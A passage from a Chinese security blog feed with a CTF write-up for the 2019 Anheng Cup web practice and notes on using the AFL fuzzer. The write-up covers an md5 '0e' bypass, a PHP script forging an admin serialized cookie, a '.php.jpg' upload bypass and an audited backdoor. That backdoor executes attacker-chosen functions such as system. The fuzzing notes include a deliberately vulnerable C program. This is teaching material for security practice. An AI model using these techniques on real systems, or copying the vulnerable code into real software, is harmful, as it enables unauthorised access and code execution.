class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode($text2));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h1><p>访问网站源代码，看到提示：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131147272.png" alt="1571131147272"></p><p>实际上是说，<code>md5($_POST[&#39;data1&#39;])!=md5($_POST[&#39;data2&#39;])</code>，由于没用全等，用<code>0e</code>绕过即可：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131226817.png" alt="1571131226817"></p><h1 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h1><h2 id="0x01-信息泄露"><a href="#0x01-信息泄露" class="headerlink" title="0x01 信息泄露"></a>0x01 信息泄露</h2><p>首先，dirsearch发现泄露.idea/workspace.xml文件：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192815365.png" alt="1571192815365"></p><p>workspace发现更多的文件：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192935874.png" alt="1571192935874"></p><p>php文件未必能访问，看<code>/web/robots.txt</code>:</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193047923.png" alt="1571193047923"></p><p>访问<code>/web/index.php?r=site/loginuser_1</code>发现有一段注释：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193204265.png" alt="1571193204265"></p><p>到Github搜索关键词，能看到更多的提示：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193458794.png" alt="1571193458794"></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193530702.png" alt="1571193530702"></p><h2 id="0x02-反序列化垂直越权"><a href="#0x02-反序列化垂直越权" class="headerlink" title="0x02 反序列化垂直越权"></a>0x02 反序列化垂直越权</h2><p>看提示大概是要用反序列化做垂直越权了：</p><p>先抓包登录，然后cookie字段被塞了一个cib字段</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193790173.png" alt="1571193790173"></p><p>考虑到注释里面，sign需要的id，name都是可控的，伪造一个admin的cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'id'</span>=&gt;$id,</span><br><span class="line">                    <span class="string">'name'</span>=&gt;$username,</span><br><span class="line">                    <span class="string">'sign'</span>=&gt;md5($id.$username),</span><br><span class="line">                );</span><br><span class="line"><span class="keyword">echo</span> serialize($sign);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到身份已经成管理员了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194732400.png" alt="1571194732400"></p><p>加一条replace给浏览器用：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194913710.png" alt="1571194913710"></p><h2 id="0x03-上传绕过"><a href="#0x03-上传绕过" class="headerlink" title="0x03 上传绕过"></a>0x03 上传绕过</h2><p>直接上传.php会被ban，考虑到其容器用的Apache/2.2.15，存在解析漏洞，故上传“.php.jpg”</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195205154.png" alt="1571195205154"></p><p>flag在根目录下：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195383816.png" alt="1571195383816"></p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开页面是一个贪吃蛇游戏，js写的：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197503720.png" alt="1571197503720"></p><p><code>/js/game.js</code>代码审计，看到一串颜文字：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197561706.png" alt="1571197561706"></p><p>console运行，返回假flag，跟进去看匿名函数，得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197802703.png" alt="1571197802703"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>2019安恒杯Web安全测试大赛练习赛writeup，<a href="http://flag0.com/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;爱い窒息、痛&quot;&gt;&lt;a href=&quot;#爱い窒息、痛&quot; class=&quot;headerlink&quot; title=&quot;爱い窒息、痛&quot;&gt;&lt;/a&gt;爱い窒息、痛&lt;/h1&gt;&lt;h2 id=&quot;0x01-路径遍历&quot;&gt;&lt;a href=&quot;#0x01-路径遍历&quot; class=&quot;headerlink&quot; title=&quot;0x01 路径遍历&quot;&gt;&lt;/a&gt;0x01 路径遍历&lt;/h2&gt;&lt;p&gt;打开地址看到路径遍历：&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126059065.png&quot; alt=&quot;1571126059065&quot;&gt;&lt;/p&gt;&lt;p&gt;在upload文件夹下发现后门和其源码&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141073240.png&quot; alt=&quot;1571141073240&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141089817.png&quot; alt=&quot;1571141089817&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;0x02-后门审计&quot;&gt;&lt;a href=&quot;#0x02-后门审计&quot; class=&quot;headerlink&quot; title=&quot;0x02 后门审计&quot;&gt;&lt;/a&gt;0x02 后门审计&lt;/h2&gt;&lt;p&gt;格式化后，进行代码审计&lt;/p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$a = &lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&#39;pass&#39;&lt;/span&gt;]) ? trim($_POST[&lt;span class=&quot;string&quot;&gt;&#39;pass&#39;&lt;/span&gt;]) : &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($a == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    echologin();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chkpass($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    helloowner($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;chkpass&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($a)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// UA是md5(POST[&#39;pass&#39;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stripos($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;HTTP_USER_AGENT&#39;&lt;/span&gt;], md5($a)) === &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echofail(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;helloowner&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($a)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 这里产生一个url&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $b = gencodeurl($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 从url获取文件内容，SSRF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $c = file_get_contents($b);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($c == &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echofail(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $d = @json_decode($c, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($d[&lt;span class=&quot;string&quot;&gt;&#39;f&#39;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echofail(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// CodeInjection, may cause RCE, e.g.,&amp;#123;&quot;f&quot;:&quot;system&quot;,&quot;d&quot;:&quot;ls&quot;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $d[&lt;span class=&quot;string&quot;&gt;&#39;f&#39;&lt;/span&gt;]($d[&lt;span class=&quot;string&quot;&gt;&#39;d&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;gencodeurl&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($a)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $e = md5(date(&lt;span class=&quot;string&quot;&gt;&quot;Y-m-d&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (strlen($a) &amp;gt; &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $f = substr($a, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $g = substr($a, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $f = &lt;span class=&quot;string&quot;&gt;&#39;good&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $g = &lt;span class=&quot;string&quot;&gt;&#39;web.com&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $b = &lt;span class=&quot;string&quot;&gt;&#39;http://&#39;&lt;/span&gt;.$f.$g; &lt;span class=&quot;comment&quot;&gt;// url=http://pass[30:35]+pass[10:20], i.e.,url&amp;lt;=15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; $b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;echofail&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($h)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;span class=&quot;comment&quot;&gt;/*...*/&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;echologin&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;span class=&quot;comment&quot;&gt;/*...*/&lt;/span&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://anemone.top/categories/CTF/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
      <category term="CTF" scheme="http://anemone.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>AFL试用笔记</title>
    <link href="http://anemone.top/fuzz-AFL%E8%AF%95%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/fuzz-AFL试用笔记/</id>
    <published>2019-10-08T12:40:13.000Z</published>
    <updated>2019-10-08T11:29:57.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="程序插桩-amp-编译"><a href="#程序插桩-amp-编译" class="headerlink" title="程序插桩&amp;编译"></a>程序插桩&amp;编译</h2><p>有问题程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> login[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Login: \n"</span>);</span><br><span class="line">    gets(login);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Password: \n"</span>);</span><br><span class="line">    gets(passwd);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(login, <span class="string">"root"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(passwd, <span class="string">"1qazxsw2"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted.\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Access Denied.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -fno-stack-protector -z execstack vuln1.c -o vuln1</span><br></pre></td></tr></table></figure><p>如果用make需要设置环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/gittup/binutils</span><br><span class="line"><span class="built_in">export</span> CC=afl-gcc</span><br><span class="line"><span class="built_in">export</span> CXX=afl-g++</span><br></pre></td></tr></table></figure><h2 id="准备输入种子"><a href="#准备输入种子" class="headerlink" title="准备输入种子"></a>准备输入种子</h2><p>创建输入输出目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir testcases results</span><br></pre></td></tr></table></figure><p>在testcases下建立以下三个文件，AFL会读取每个文件的内容，将每一行输入到vuln1的标准输入中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| test1.txt | test2.txt | test3.txt |</span><br><span class="line">| --------- | --------- | --------- |</span><br><span class="line">| a         | root      | root      |</span><br><span class="line">| a         | a         | 1qazxsw2  |</span><br></pre></td></tr></table></figure></p><h3 id="种子精简"><a href="#种子精简" class="headerlink" title="种子精简"></a>种子精简</h3><p><strong>afl-cmin工具</strong>需要一个给定的包含可能的（potential）test case的文件夹，然后运行每一个并将收到的反馈与所有其他的test case进行对比，找到最有效地表示最unique的代码路径的最好的test case。最好的test case被保存到一个新的目录。</p><p> <strong>afl-tmin工具</strong>只用于一个指定的文件。当我们进行fuzzing时，我们不想浪费CPU来处理一些相对于test case表示代码路径来说无用的bit或byte。为了使每一个test case达到表示与原始测试用例相同的代码路径所需的最小值，afl-tmin遍历test case的实际字节，逐步删除很小的数据块，直到删除任意字节都会影响到代码路径表示。</p><h2 id="启动AFL"><a href="#启动AFL" class="headerlink" title="启动AFL"></a>启动AFL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt; /proc/sys/kernel/core_pattern <span class="comment"># WSL不需要</span></span><br><span class="line">afl-fuzz -i ./testcases/ -o ./results/ ./vuln1</span><br></pre></td></tr></table></figure><p>如果程序通过参数读取文件，可以用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i afl_in -o afl_out ./binutils/readelf -a @@</span><br></pre></td></tr></table></figure></p><p>出现以下界面</p><p><img src="/fuzz-AFL试用笔记/1567758115844.png" alt="1567758115844"></p><h2 id="查看crash"><a href="#查看crash" class="headerlink" title="查看crash"></a>查看crash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls results/crashes/ -al</span><br><span class="line">total 4</span><br><span class="line">drwx------ 1 root root 512 Sep  6 16:22 .</span><br><span class="line">drwxrwxrwx 1 root root 512 Sep  6 16:21 ..</span><br><span class="line">-rw------- 1 root root 611 Sep  6 16:21 fuzz-AFL试用笔记.txt</span><br><span class="line">-rw------- 1 root root 137 Sep  6 16:21 id:000000,sig:11,src:000000,op:havoc,rep:64</span><br><span class="line">-rw------- 1 root root  65 Sep  6 16:22 id:000001,sig:11,src:000002,op:havoc,rep:128</span><br></pre></td></tr></table></figure><p>查看一个测试用例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat results/crashes/id:000000,sig:11,src:000000,op:havoc,rep:64</span><br></pre></td></tr></table></figure></p><h1 id="kelinci"><a href="#kelinci" class="headerlink" title="kelinci"></a>kelinci</h1><h2 id="AFL端"><a href="#AFL端" class="headerlink" title="AFL端"></a>AFL端</h2><p>一个C程序作为接口，它与afl-gcc/g++编译出来的程序相同，将AFL的输入通过TCP发送给Java，再将执行结果返回返回给afl。在<code>fuzzerside/</code>下用<code>make</code>编译</p><h2 id="JAVA端"><a href="#JAVA端" class="headerlink" title="JAVA端"></a>JAVA端</h2><p>用于包装fuzz对象，建立一个TCP服务器，返回退出代码和路径信息。它在<code>instrumentor/</code>目录下用<code>gradle build</code>构建</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;AFL&quot;&gt;&lt;a href=&quot;#AFL&quot; class=&quot;headerlink&quot; title=&quot;AFL&quot;&gt;&lt;/a&gt;AFL&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&quot;程序插桩-amp-编译&quot;&gt;&lt;a href=&quot;#程序插桩-amp-编译&quot; class=&quot;headerlink&quot; title=&quot;程序插桩&amp;amp;编译&quot;&gt;&lt;/a&gt;程序插桩&amp;amp;编译&lt;/h2&gt;&lt;p&gt;有问题程序&lt;/p&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span 